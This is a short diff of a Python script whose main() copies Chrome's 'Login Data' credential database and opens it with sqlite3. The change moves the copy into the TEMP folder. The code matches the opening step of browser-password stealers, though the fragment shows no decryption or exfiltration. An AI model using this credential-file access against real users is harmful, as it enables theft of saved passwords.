@@ -57,7 +57,7 @@ def main():
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
     
-    filename = "ChromeData.db"
+    filename = os.path.join(os.environ["TEMP"], "ChromeData.db")
     shutil.copyfile(db_path, filename)
     
     db = sqlite3.connect(filename)
